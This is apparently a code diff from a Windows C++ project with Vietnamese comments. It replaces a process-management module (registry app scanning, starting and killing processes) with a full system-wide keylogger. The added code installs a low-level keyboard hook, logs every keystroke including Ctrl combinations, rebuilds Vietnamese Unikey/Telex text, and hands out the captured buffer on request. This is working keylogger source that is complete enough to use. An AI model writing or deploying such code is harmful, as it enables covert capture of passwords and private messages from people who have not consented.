@@ -1,388 +1,352 @@
-﻿#include "Process.h"
+﻿#include "Keylogger.h"
+#include <iostream>
+#include <sstream>
 
-// Link thư viện hệ thống
-#pragma comment(lib, "psapi.lib")
-#pragma comment(lib, "advapi32.lib")
-#pragma comment(lib, "user32.lib")
-#pragma comment(lib, "shell32.lib") // Quan trọng cho ShellExecute
+// Con trỏ toàn cục để hàm static KeyboardProc có thể truy cập vào instance của class
+Keylogger* g_KeyloggerInstance = nullptr;
 
-using namespace std;
-
-// --- Helper Fix Lỗi Unicode ---
-string Process::ConvertToString(const WCHAR* wstr) {
-    if (!wstr) return "";
-    int size = WideCharToMultiByte(CP_UTF8, 0, wstr, -1, NULL, 0, NULL, NULL);
-    if (size <= 0) return "";
-    string str(size - 1, 0);
-    WideCharToMultiByte(CP_UTF8, 0, wstr, -1, &str[0], size, NULL, NULL);
-    return str;
+// --- Constructor: Khởi tạo các giá trị mặc định và gán instance toàn cục ---
+Keylogger::Keylogger()
+    : _isRunning(false), _hook(NULL), _threadId(0),
+    _detectedMode("Auto-Detect"),
+    _inputMethodStatus("Waiting..."),
+    _lastPhysicalKey(0),
+    _lastWasInjectedBackspace(false) {
+    g_KeyloggerInstance = this;
 }
 
-Process::Process() { m_isListLoaded = false; }
-
-// --- UTILS ---
-string Process::ToLower(string str) {
-    string res = str;
-    transform(res.begin(), res.end(), res.begin(), ::tolower);
-    return res;
+// --- Destructor: Đảm bảo dừng luồng và gỡ Hook trước khi hủy đối tượng ---
+Keylogger::~Keylogger() {
+    StopKeyLogging();
+    g_KeyloggerInstance = nullptr;
 }
 
-bool Process::IsNumeric(const string& str) {
-    if (str.empty()) return false;
-    return all_of(str.begin(), str.end(), ::isdigit);
-}
-
-string Process::CleanPath(const string& rawPath) {
-    string s = rawPath;
-    // Xóa khoảng trắng đầu cuối
-    size_t first = s.find_first_not_of(" \t\r\n");
-    if (string::npos == first) return "";
-    size_t last = s.find_last_not_of(" \t\r\n");
-    s = s.substr(first, (last - first + 1));
-
-    // Xóa dấu ngoặc kép nếu có
-    s.erase(remove(s.begin(), s.end(), '\"'), s.end());
-
-    // Cắt các tham số sau dấu phẩy (nếu có trong Registry)
-    size_t commaPos = s.find(',');
-    if (commaPos != string::npos) s = s.substr(0, commaPos);
-
-    return s;
-}
-
-// Thay thế hàm GetRegString cũ trong Process.cpp bằng hàm này :
-string Process::GetRegString(HKEY hKey, const char* valueName) {
-    // 1. Chuyển tên Value (ví dụ "DisplayName") từ char* sang WCHAR* để dùng API Unicode
-    int len = MultiByteToWideChar(CP_ACP, 0, valueName, -1, NULL, 0);
-    if (len <= 0) return "";
-    wstring wValueName(len, 0);
-    MultiByteToWideChar(CP_ACP, 0, valueName, -1, &wValueName[0], len);
-
-    // 2. Dùng RegQueryValueExW (Phiên bản Unicode) thay vì A
-    WCHAR buffer[4096]; // Tăng buffer lên 4096 để tránh bị tràn với các app tên dài
-    DWORD size = sizeof(buffer);
-    DWORD type;
-
-    // Lưu ý: wValueName.c_str() cắt bỏ ký tự null thừa ở cuối nếu có
-    if (RegQueryValueExW(hKey, wValueName.data(), NULL, &type, (LPBYTE)buffer, &size) == ERROR_SUCCESS) {
-        // Chỉ lấy dữ liệu dạng chuỗi
-        if (type == REG_SZ || type == REG_EXPAND_SZ) {
-            // 3. Quan trọng: Chuyển từ WCHAR (Unicode) sang UTF-8 bằng hàm có sẵn của bạn
-            return ConvertToString(buffer);
+// --- Callback Static: Hàm cầu nối nhận sự kiện từ Windows và chuyển cho ProcessKey ---
+LRESULT CALLBACK Keylogger::KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
+    // nCode >= 0: Có sự kiện xử lý được
+    // wParam == WM_KEYDOWN: Chỉ bắt sự kiện nhấn phím xuống
+    if (nCode >= 0 && wParam == WM_KEYDOWN) {
+        KBDLLHOOKSTRUCT* pKey = (KBDLLHOOKSTRUCT*)lParam;
+        if (g_KeyloggerInstance) {
+            // Chuyển tiếp mã phím, mã quét và cờ trạng thái vào hàm xử lý chính
+            g_KeyloggerInstance->ProcessKey(pKey->vkCode, pKey->scanCode, pKey->flags);
         }
     }
-    return "";
+    // CallNextHookEx: Bắt buộc gọi để các ứng dụng khác vẫn nhận được phím
+    return CallNextHookEx(NULL, nCode, wParam, lParam);
 }
 
+// --- Hàm tiện ích: Xóa ký tự UTF-8 cuối cùng (xử lý byte đa luồng) ---
+// UTF-8 có thể dùng 1-4 byte cho 1 ký tự. Hàm này xóa đúng toàn bộ byte của ký tự cuối.
+void PopLastUtf8Char(std::string& str) {
+    if (str.empty()) return;
+    // Nếu byte cuối là ASCII (0xxxxxxx), xóa bình thường
+    if ((str.back() & 0x80) == 0) { str.pop_back(); return; }
+    // Nếu là byte tiếp theo (10xxxxxx), xóa lùi cho đến khi gặp byte đầu (11xxxxxx)
+    while (!str.empty() && (str.back() & 0xC0) == 0x80) { str.pop_back(); }
+    // Xóa nốt byte đầu của ký tự đa byte
+    if (!str.empty()) str.pop_back();
+}
 
-double Process::GetProcessMemory(DWORD pid) {
-    PROCESS_MEMORY_COUNTERS pmc;
-    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
-    if (hProcess == NULL) return 0.0;
-    if (GetProcessMemoryInfo(hProcess, &pmc, sizeof(pmc))) {
-        CloseHandle(hProcess);
-        return (double)pmc.WorkingSetSize / (1024 * 1024);
+// --- HÀM MAP PHÍM ULTRA FULL (KHÔNG BỎ SÓT PHÍM NÀO) ---
+// Chuyển đổi mã phím ảo (Virtual Key) thành chuỗi hiển thị (Log thô)
+std::string Keylogger::MapVkToRawString(DWORD vkCode, bool isShift, bool isCaps) {
+    bool isUpper = isShift ^ isCaps;
+
+    // 1. CHỮ CÁI A-Z
+    if (vkCode >= 'A' && vkCode <= 'Z') {
+        char c = (char)vkCode;
+        if (!isUpper) c += 32;
+        bool isCtrl = (GetKeyState(VK_CONTROL) & 0x8000) != 0;
+        if (isCtrl) return "[CTRL+" + std::string(1, (char)vkCode) + "]";
+        return std::string(1, c);
     }
-    CloseHandle(hProcess);
-    return 0.0;
-}
 
-// --- REGISTRY SCANNING ---
-void Process::ScanRegistryKey(HKEY hRoot, const char* subKey) {
-    HKEY hUninstall;
-    if (RegOpenKeyExA(hRoot, subKey, 0, KEY_READ, &hUninstall) != ERROR_SUCCESS) return;
-    char keyName[256];
-    DWORD index = 0;
-    DWORD keyNameLen = 256;
-    while (RegEnumKeyExA(hUninstall, index, keyName, &keyNameLen, NULL, NULL, NULL, NULL) == ERROR_SUCCESS) {
-        HKEY hApp;
-        if (RegOpenKeyExA(hUninstall, keyName, 0, KEY_READ, &hApp) == ERROR_SUCCESS) {
-            string name = GetRegString(hApp, "DisplayName");
-            string iconPath = GetRegString(hApp, "DisplayIcon");
-            if (iconPath.empty()) iconPath = GetRegString(hApp, "InstallLocation");
-
-            if (!name.empty() && !iconPath.empty()) {
-                string exePath = CleanPath(iconPath);
-                // Chỉ lấy nếu là exe
-                if (ToLower(exePath).find(".exe") != string::npos) {
-                    m_installedApps.push_back({ name, exePath });
-                }
-            }
-            RegCloseKey(hApp);
-        }
-        keyNameLen = 256; index++;
+    // 2. SỐ 0-9
+    if (vkCode >= '0' && vkCode <= '9') {
+        if (isShift) { const char s[] = ")!@#$%^&*("; return std::string(1, s[vkCode - '0']); }
+        return std::string(1, (char)vkCode);
     }
-    RegCloseKey(hUninstall);
+
+    // 3. F1 - F24
+    if (vkCode >= VK_F1 && vkCode <= VK_F24) return "[F" + std::to_string(vkCode - VK_F1 + 1) + "]";
+
+    // 4. FULL DANH SÁCH PHÍM CHỨC NĂNG (THEO CHUẨN MICROSOFT)
+    switch (vkCode) {
+        // --- Chuột ---
+    case VK_LBUTTON:  return "[MOUSE_L]";
+    case VK_RBUTTON:  return "[MOUSE_R]";
+    case VK_CANCEL:   return "[BREAK]";
+    case VK_MBUTTON:  return "[MOUSE_M]";
+    case VK_XBUTTON1: return "[MOUSE_X1]";
+    case VK_XBUTTON2: return "[MOUSE_X2]";
+
+        // --- Cơ bản ---
+    case VK_BACK:     return "[BACK]";
+    case VK_TAB:      return "[TAB]";
+    case VK_CLEAR:    return "[CLEAR]";
+    case VK_RETURN:   return "\n";
+    case VK_SPACE:    return " ";
+    case VK_ESCAPE:   return "[ESC]";
+    case VK_CAPITAL:  return "[CAPS]";
+    case VK_LSHIFT:   return "[LSHIFT]";
+    case VK_RSHIFT:   return "[RSHIFT]";
+    case VK_LCONTROL: return "[LCTRL]";
+    case VK_RCONTROL: return "[RCTRL]";
+    case VK_LMENU:    return "[LALT]";
+    case VK_RMENU:    return "[RALT]";
+    case VK_LWIN:     return "[LWIN]";
+    case VK_RWIN:     return "[RWIN]";
+    case VK_APPS:     return "[MENU]";
+    case VK_SLEEP:    return "[SLEEP]"; // Phím ngủ
+
+        // --- Điều hướng & Soạn thảo ---
+    case VK_PRIOR:    return "[PAGEUP]";
+    case VK_NEXT:     return "[PAGEDOWN]";
+    case VK_END:      return "[END]";
+    case VK_HOME:     return "[HOME]";
+    case VK_LEFT:     return "[LEFT]";
+    case VK_UP:       return "[UP]";
+    case VK_RIGHT:    return "[RIGHT]";
+    case VK_DOWN:     return "[DOWN]";
+    case VK_SELECT:   return "[SELECT]";
+    case VK_PRINT:    return "[PRINT]";
+    case VK_EXECUTE:  return "[EXECUTE]";
+    case VK_SNAPSHOT: return "[PRINTSCR]";
+    case VK_INSERT:   return "[INS]";
+    case VK_DELETE:   return "[DEL]";
+    case VK_HELP:     return "[HELP]";
+    case VK_SCROLL:   return "[SCROLLLOCK]";
+    case VK_PAUSE:    return "[PAUSE]";
+
+        // --- NUMPAD (Bàn phím số) ---
+    case VK_NUMPAD0:  return "0";
+    case VK_NUMPAD1:  return "1";
+    case VK_NUMPAD2:  return "2";
+    case VK_NUMPAD3:  return "3";
+    case VK_NUMPAD4:  return "4";
+    case VK_NUMPAD5:  return "5";
+    case VK_NUMPAD6:  return "6";
+    case VK_NUMPAD7:  return "7";
+    case VK_NUMPAD8:  return "8";
+    case VK_NUMPAD9:  return "9";
+    case VK_MULTIPLY: return "*";
+    case VK_ADD:      return "+";
+    case VK_SEPARATOR:return "|";
+    case VK_SUBTRACT: return "-";
+    case VK_DECIMAL:  return ".";
+    case VK_DIVIDE:   return "/";
+    case VK_NUMLOCK:  return "[NUMLOCK]";
+
+        // --- MULTIMEDIA  ---
+    case VK_VOLUME_MUTE:     return "[MUTE]";
+    case VK_VOLUME_DOWN:     return "[VOL-]";
+    case VK_VOLUME_UP:       return "[VOL+]";
+    case VK_MEDIA_NEXT_TRACK:return "[NEXT]";
+    case VK_MEDIA_PREV_TRACK:return "[PREV]";
+    case VK_MEDIA_STOP:      return "[STOP]";
+    case VK_MEDIA_PLAY_PAUSE:return "[PLAY/PAUSE]";
+
+        // --- BROWSER ---
+    case VK_BROWSER_BACK:    return "[WEB_BACK]";
+    case VK_BROWSER_FORWARD: return "[WEB_FWD]";
+    case VK_BROWSER_REFRESH: return "[REFRESH]";
+    case VK_BROWSER_STOP:    return "[WEB_STOP]";
+    case VK_BROWSER_SEARCH:  return "[SEARCH]";
+    case VK_BROWSER_FAVORITES:return "[FAV]";
+    case VK_BROWSER_HOME:    return "[WEB_HOME]";
+
+        // --- LAUNCHER ---
+    case VK_LAUNCH_MAIL:     return "[MAIL]";
+    case VK_LAUNCH_MEDIA_SELECT: return "[MEDIA]";
+    case VK_LAUNCH_APP1:     return "[APP1]";
+    case VK_LAUNCH_APP2:     return "[APP2]";
+
+        // --- DẤU CÂU (OEM) ---
+    case VK_OEM_1:       return isShift ? ":" : ";";
+    case VK_OEM_PLUS:    return isShift ? "+" : "=";
+    case VK_OEM_COMMA:   return isShift ? "<" : ",";
+    case VK_OEM_MINUS:   return isShift ? "_" : "-";
+    case VK_OEM_PERIOD:  return isShift ? ">" : ".";
+    case VK_OEM_2:       return isShift ? "?" : "/";
+    case VK_OEM_3:       return isShift ? "~" : "`";
+    case VK_OEM_4:       return isShift ? "{" : "[";
+    case VK_OEM_5:       return isShift ? "|" : "\\";
+    case VK_OEM_6:       return isShift ? "}" : "]";
+    case VK_OEM_7:       return isShift ? "\"" : "'";
+    case VK_OEM_8:       return "[OEM8]"; // Phím lạ tùy bàn phím
+    case VK_OEM_102:     return isShift ? ">" : "<"; // Phím <> cạnh Shift trái (ISO)
+    case VK_OEM_CLEAR:   return "[CLEAR]";
+
+        // --- IME (Bộ gõ Nhật/Hàn/Trung) ---
+    case VK_KANA:     return "[IME_KANA]";
+    case VK_JUNJA:    return "[IME_JUNJA]";
+    case VK_FINAL:    return "[IME_FINAL]";
+    case VK_HANJA:    return "[IME_HANJA]";
+    case VK_CONVERT:  return "[IME_CONVERT]";
+    case VK_NONCONVERT: return "[IME_NONCONVERT]";
+    case VK_ACCEPT:   return "[IME_ACCEPT]";
+    case VK_MODECHANGE: return "[IME_MODECHANGE]";
+    case VK_PROCESSKEY: return "[PROCESS]"; // Phím đang được IME xử lý
+
+        // --- CÁC PHÍM LẠ KHÁC ---
+    case VK_PACKET:     return ""; // Bỏ qua phím Unicode ảo
+    case VK_ATTN:       return "[ATTN]";
+    case VK_CRSEL:      return "[CRSEL]";
+    case VK_EXSEL:      return "[EXSEL]";
+    case VK_EREOF:      return "[EREOF]";
+    case VK_PLAY:       return "[PLAY]";
+    case VK_ZOOM:       return "[ZOOM]";
+    case VK_PA1:        return "[PA1]";
+
+    case 0xFF: return ""; // Bỏ qua
+    }
+
+    // Nếu vẫn không có trong danh sách trên thì in Hex để debug
+    char buff[64];
+    sprintf_s(buff, "[0x%X]", vkCode);
+    return std::string(buff);
 }
 
-void Process::ScanAppPaths(HKEY hRoot, const char* subKey) {
-    HKEY hAppPaths;
-    if (RegOpenKeyExA(hRoot, subKey, 0, KEY_READ, &hAppPaths) != ERROR_SUCCESS)
+// --- Phân tích trạng thái bộ gõ (Unikey/System IME) ---
+void Keylogger::AnalyzeInputMethod(DWORD vkCode, bool isInjected) {
+    HKL currentLayout = GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), NULL));
+
+    // 1. Kiểm tra bộ gõ Windows mặc định (WinIME)
+    if ((reinterpret_cast<UINT_PTR>(currentLayout) & 0xFFFF) == 0x042a) {
+        _inputMethodStatus = "VIETNAMESE (WinIME)";
+        _detectedMode = "Microsoft Telex"; // Windows 10/11 tích hợp sẵn
         return;
+    }
 
-    char keyName[256];
-    DWORD index = 0;
+    // 2. Kiểm tra Unikey (Dựa vào cờ isInjected - Phím giả)
+    if (isInjected) {
+        _inputMethodStatus = "VIETNAMESE (Unikey)";
 
-    while (true) {
-        DWORD nameLen = sizeof(keyName);
-        FILETIME ft{};
-        LONG res = RegEnumKeyExA(
-            hAppPaths,
-            index,
-            keyName,
-            &nameLen,
-            nullptr,
-            nullptr,
-            nullptr,
-            &ft
-        );
-
-        if (res == ERROR_NO_MORE_ITEMS) {
-            break; // duyệt hết
+        // Logic đoán Telex/VNI dựa vào phím xóa (Backspace) giả
+        if (vkCode == VK_BACK) {
+            if (strchr("SFRXJAOWD", (char)_lastPhysicalKey)) _detectedMode = "TELEX";
+            else if (_lastPhysicalKey >= '0' && _lastPhysicalKey <= '9') _detectedMode = "VNI";
         }
-        if (res != ERROR_SUCCESS) {
-            ++index;
-            continue; // lỗi lặt vặt → skip key này
-        }
-
-        // Mở subkey: ví dụ "notepad.exe"
-        HKEY hEntry;
-        if (RegOpenKeyExA(hAppPaths, keyName, 0, KEY_READ, &hEntry) != ERROR_SUCCESS) {
-            ++index;
-            continue;
-        }
-
-        // Đọc default value (tên value = NULL)
-        char  buffer[1024];
-        DWORD size = sizeof(buffer);
-        DWORD type = 0;
-        std::string exePath;
-
-        if (RegQueryValueExA(hEntry, nullptr, nullptr, &type,
-            (LPBYTE)buffer, &size) == ERROR_SUCCESS) {
-            if (type == REG_SZ || type == REG_EXPAND_SZ) {
-                // buffer đã là chuỗi C kết thúc \0
-                exePath.assign(buffer);
+    }
+    // 3. Nếu là phím thật (Không phải do phần mềm bơm vào) -> Tiếng Anh
+    else {
+        // Chỉ xét các phím ký tự thông thường
+        if ((vkCode >= 'A' && vkCode <= 'Z') || (vkCode >= '0' && vkCode <= '9')) {
+            // Nếu trước đó không phải Unikey thì chốt là Tiếng Anh
+            if (_inputMethodStatus.find("Unikey") == std::string::npos) {
+                _inputMethodStatus = "ENGLISH (Confirmed)";
+                _detectedMode = "---";
             }
         }
-
-        RegCloseKey(hEntry);
-
-        if (exePath.empty()) {
-            ++index;
-            continue;
-        }
-
-        // Làm sạch path và check .exe
-        exePath = CleanPath(exePath);
-        std::string lowerPath = ToLower(exePath);
-        if (lowerPath.find(".exe") == std::string::npos) {
-            ++index;
-            continue;
-        }
-
-        // Lấy tên hiển thị từ tên key, VD "notepad.exe" -> "notepad"
-        std::string displayName = keyName;
-        std::string lowerKey = ToLower(displayName);
-        if (lowerKey.size() > 4 &&
-            lowerKey.substr(lowerKey.size() - 4) == ".exe") {
-            displayName = displayName.substr(0, displayName.size() - 4);
-        }
-
-        // Tránh trùng app đã có từ Uninstall: so sánh theo path normalize
-        bool exists = false;
-        std::string normalizedNew = ToLower(CleanPath(exePath));
-        for (const auto& app : m_installedApps) {
-            std::string normalizedOld = ToLower(CleanPath(app.path));
-            if (normalizedOld == normalizedNew) {
-                exists = true;
-                break;
-            }
-        }
-
-        if (!exists) {
-            // AppInfo { name, path }
-            m_installedApps.push_back({ displayName, exePath });
-        }
-
-        ++index;
+        _lastPhysicalKey = vkCode;
     }
-
-    RegCloseKey(hAppPaths);
 }
 
+// --- Hàm xử lý chính: Chuyển đổi mã phím, xử lý logic bộ gõ và lưu log ---
+void Keylogger::ProcessKey(DWORD vkCode, DWORD scanCode, DWORD flags) {
+    std::lock_guard<std::mutex> lock(_mutex);
+    bool isInjected = (flags & LLKHF_INJECTED) != 0;
 
-void Process::LoadInstalledApps() {
-    m_installedApps.clear();
+    AnalyzeInputMethod(vkCode, isInjected);
 
-    // 1. App cài đặt tiêu chuẩn (có Uninstall)
-    ScanRegistryKey(HKEY_LOCAL_MACHINE,
-        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall");
-    ScanRegistryKey(HKEY_LOCAL_MACHINE,
-        "SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall");
-    ScanRegistryKey(HKEY_CURRENT_USER,
-        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall");
+    // [RAW BUFFER] - Ghi lại tất cả phím thật (không phải phím ảo do Unikey tạo)
+    if (!isInjected) {
+        bool isShift = (GetKeyState(VK_SHIFT) & 0x8000) != 0;
+        bool isCaps = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
+        _rawLogBuffer += MapVkToRawString(vkCode, isShift, isCaps);
+    }
 
-    // 2. App có đăng ký App Paths (rất nhiều app hệ thống + user app)
-    ScanAppPaths(HKEY_LOCAL_MACHINE,
-        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths");
-    ScanAppPaths(HKEY_CURRENT_USER,
-        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths");
+    // Xử lý phím BACKSPACE (Unikey thường gửi Backspace để sửa dấu)
+    if (vkCode == VK_BACK) {
+        PopLastUtf8Char(_finalLogBuffer);
 
-    m_isListLoaded = true;
+        // Nếu Backspace này do phần mềm (Unikey) gửi, bật cờ lên
+        if (isInjected) _lastWasInjectedBackspace = true;
+        else _lastWasInjectedBackspace = false;
+
+        return; // Kết thúc xử lý phím Backspace
+    }
+
+    // Xử lý các phím ký tự (TAB đổi thành Space)
+    if (vkCode == VK_TAB) {
+        _finalLogBuffer += " ";
+        _lastWasInjectedBackspace = false; // Reset cờ
+        return;
+    }
+
+    // Chuyển đổi sang Unicode
+    BYTE keyboardState[256];
+    GetKeyboardState(keyboardState); // Lấy trạng thái bàn phím hiện tại
+    // Force cập nhật trạng thái Shift và CapsLock để ToUnicode hoạt động đúng
+    if (GetKeyState(VK_SHIFT) & 0x8000) keyboardState[VK_SHIFT] = 0x80;
+    if (GetKeyState(VK_CAPITAL) & 0x0001) keyboardState[VK_CAPITAL] = 0x01;
+
+    WCHAR buffer[16] = { 0 };
+    if (vkCode == VK_PACKET) { buffer[0] = (WCHAR)scanCode; }
+    else { ToUnicode(vkCode, scanCode, keyboardState, buffer, 16, 0); }
+
+    char utf8Buffer[16] = { 0 };
+    // Nếu chuyển đổi thành công ra ký tự văn bản
+    if (WideCharToMultiByte(CP_UTF8, 0, buffer, 1, utf8Buffer, 16, NULL, NULL) > 0) {
+
+        // Nếu trước đó Unikey vừa xóa ký tự (để bỏ dấu), ta cần xóa thêm 1 lần nữa trong log
+        // để đồng bộ với màn hình hiển thị
+        if (isInjected && _lastWasInjectedBackspace) {
+            PopLastUtf8Char(_finalLogBuffer);
+        }
+
+        // Reset cờ vì phím này không phải Backspace
+        _lastWasInjectedBackspace = false;
+
+        bool isCtrl = (GetKeyState(VK_CONTROL) & 0x8000) != 0;
+        if (!isCtrl || vkCode == VK_RETURN) _finalLogBuffer += utf8Buffer;
+    }
+    else {
+        // Nếu không ra ký tự (ví dụ phím F1, Shift...), cũng reset cờ
+        _lastWasInjectedBackspace = false;
+    }
 }
 
-
-
-// --- RECURSIVE SEARCH HELPERS ---
-
-string Process::FindFileRecursive(string directory, string fileToFind) {
-    string searchPath = directory + "\\*";
-    WIN32_FIND_DATAA findData;
-    HANDLE hFind = FindFirstFileA(searchPath.c_str(), &findData);
-
-    if (hFind == INVALID_HANDLE_VALUE) return "";
-
-    string resultPath = "";
-    string lowerFind = ToLower(fileToFind);
-
-    do {
-        string currentName = findData.cFileName;
-        if (currentName == "." || currentName == "..") continue;
-
-        string fullPath = directory + "\\" + currentName;
-
-        if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
-            // Đệ quy vào thư mục con
-            string found = FindFileRecursive(fullPath, fileToFind);
-            if (!found.empty()) {
-                resultPath = found;
-                break;
-            }
-        }
-        else {
-            string lowerName = ToLower(currentName);
-            // Logic tìm kiếm: Tên file chứa từ khóa VÀ phải là .exe hoặc .lnk (shortcut)
-            if (lowerName.find(lowerFind) != string::npos) {
-                if (lowerName.find(".lnk") != string::npos || lowerName.find(".exe") != string::npos) {
-                    resultPath = fullPath;
-                    break;
-                }
-            }
-        }
-    } while (FindNextFileA(hFind, &findData));
-
-    FindClose(hFind);
-    return resultPath;
+void Keylogger::RunHookLoop() {
+    _threadId = GetCurrentThreadId();
+    // Cài đặt Hook bàn phím, chạy vòng lặp nhận tin nhắn hệ thống và gỡ Hook khi nhận lệnh dừng.
+    _hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
+    if (!_hook) return;
+    MSG msg;
+    while (GetMessage(&msg, NULL, 0, 0)) {
+        if (msg.message == WM_QUIT) break;
+        TranslateMessage(&msg);
+        DispatchMessage(&msg);
+    }
+    UnhookWindowsHookEx(_hook);
+    _hook = NULL; _threadId = 0;
 }
 
-string Process::FindAppInStartMenu(string appName) {
-    char path[MAX_PATH];
-    string foundPath = "";
-
-    // Các folder Start Menu phổ biến
-    vector<int> foldersToCheck = {
-        CSIDL_COMMON_PROGRAMS, // Start Menu (All Users)
-        CSIDL_PROGRAMS,        // Start Menu (Current User)
-        CSIDL_DESKTOPDIRECTORY // Desktop
-    };
-
-    for (int folderId : foldersToCheck) {
-        if (SHGetFolderPathA(NULL, folderId, NULL, 0, path) == S_OK) {
-            foundPath = FindFileRecursive(string(path), appName);
-            if (!foundPath.empty()) return foundPath;
-        }
-    }
-    return "";
+void Keylogger::StartKeyLogging() {
+    if (_isRunning) return;
+    _isRunning = true;
+    _rawLogBuffer = ""; _finalLogBuffer = "";
+    // Tạo một luồng (thread) riêng biệt để chạy vòng lặp bắt phím mà không làm đơ chương trình chính.
+    _loggerThread = std::thread(&Keylogger::RunHookLoop, this);
 }
 
-// --- START PROCESS (CORE LOGIC) ---
-bool Process::StartProcess(const string& nameOrPath) {
-    if (nameOrPath.empty()) return false;
-    string input = ToLower(nameOrPath);
-
-    // Xử lý cắt đuôi .exe nếu người dùng nhập (ví dụ "discord.exe" -> "discord")
-    string searchName = input;
-    if (searchName.length() > 4 && searchName.substr(searchName.length() - 4) == ".exe") {
-        searchName = searchName.substr(0, searchName.length() - 4);
-    }
-
-    // --- TH1: Thử chạy trực tiếp (Hệ thống hoặc đường dẫn đầy đủ) ---
-    // Ví dụ: "calc", "notepad", "C:\\Windows\\System32\\cmd.exe"
-    // Nếu > 32 là thành công
-    HINSTANCE res = ShellExecuteA(NULL, "open", nameOrPath.c_str(), NULL, NULL, SW_SHOWNORMAL);
-    if ((intptr_t)res > 32) return true;
-
-    // --- TH2: Tìm trong danh sách Registry đã load ---
-    if (!m_isListLoaded) LoadInstalledApps();
-
-    for (const auto& app : m_installedApps) {
-        // So sánh tên hiển thị hoặc đường dẫn
-        if (ToLower(app.name).find(searchName) != string::npos || ToLower(app.path).find(searchName) != string::npos) {
-            HINSTANCE res = ShellExecuteA(NULL, "open", app.path.c_str(), NULL, NULL, SW_SHOWNORMAL);
-            if ((intptr_t)res > 32) return true;
-        }
-    }
-
-    // --- TH3: Tìm đệ quy trong Start Menu (Fallback cuối cùng) ---
-    // Discord và các app cài User thường nằm ở đây dưới dạng shortcut
-    string shortcutPath = FindAppInStartMenu(searchName);
-    if (!shortcutPath.empty()) {
-        // Chạy file .lnk hoặc .exe tìm được
-        HINSTANCE res = ShellExecuteA(NULL, "open", shortcutPath.c_str(), NULL, NULL, SW_SHOWNORMAL);
-        return ((intptr_t)res > 32);
-    }
-
-    return false;
+void Keylogger::StopKeyLogging() {
+    if (!_isRunning) return;
+    _isRunning = false;
+    // Gửi tin nhắn WM_QUIT vào luồng đang chạy để ngắt vòng lặp và chờ luồng đó tắt hoàn toàn (join).
+    if (_threadId != 0) PostThreadMessage(_threadId, WM_QUIT, 0, 0);
+    if (_loggerThread.joinable()) _loggerThread.join();
 }
 
-// --- STOP & LIST PROCESS ---
-string Process::StopProcess(const string& nameOrPid) {
-    if (IsNumeric(nameOrPid)) {
-        DWORD pid = stoul(nameOrPid);
-        HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
-        if (hProcess && TerminateProcess(hProcess, 1)) {
-            CloseHandle(hProcess);
-            return "Killed PID " + nameOrPid;
-        }
-        return "Err: Cannot kill PID " + nameOrPid;
-    }
-
-    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    if (hSnap == INVALID_HANDLE_VALUE) return "Err Snapshot";
-
-    PROCESSENTRY32W pe32; pe32.dwSize = sizeof(PROCESSENTRY32W);
-    int count = 0;
-    string target = ToLower(nameOrPid);
-
-    if (Process32FirstW(hSnap, &pe32)) {
-        do {
-            string exeName = ConvertToString(pe32.szExeFile);
-            string lowerName = ToLower(exeName);
-            if (lowerName == target || lowerName == target + ".exe") {
-                HANDLE hProc = OpenProcess(PROCESS_TERMINATE, FALSE, pe32.th32ProcessID);
-                if (hProc) { TerminateProcess(hProc, 1); CloseHandle(hProc); count++; }
-            }
-        } while (Process32NextW(hSnap, &pe32));
-    }
-    CloseHandle(hSnap);
-    return count > 0 ? "Killed " + to_string(count) : "Not found";
-}
-
-string Process::ListProcesses() {
-    stringstream ss;
-    ss << "PID\tRAM(MB)\tThreads\tName\n";
-    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    if (hSnap == INVALID_HANDLE_VALUE) return "Err Snapshot";
-
-    PROCESSENTRY32W pe32; pe32.dwSize = sizeof(PROCESSENTRY32W);
-    if (Process32FirstW(hSnap, &pe32)) {
-        do {
-            string exeName = ConvertToString(pe32.szExeFile);
-            double ram = GetProcessMemory(pe32.th32ProcessID);
-            ss << pe32.th32ProcessID << "\t" << fixed << setprecision(1) << ram << "\t" << pe32.cntThreads << "\t" << exeName << "\n";
-        } while (Process32NextW(hSnap, &pe32));
-    }
-    CloseHandle(hSnap);
+std::string Keylogger::GetLoggedKeys() {
+    // Dùng Mutex khóa luồng để trích xuất dữ liệu an toàn, sau đó xóa bộ đệm ngay lập tức.
+    std::lock_guard<std::mutex> lock(_mutex);
+    std::stringstream ss;
+    ss << "MODE: " << _detectedMode << "\n";
+    ss << "STATUS: " << _inputMethodStatus << "\n";
+    ss << "---RAW---\n" << _rawLogBuffer << "\n";
+    ss << "---TEXT---\n" << _finalLogBuffer;
+    _rawLogBuffer.clear(); _finalLogBuffer.clear();
     return ss.str();
 }
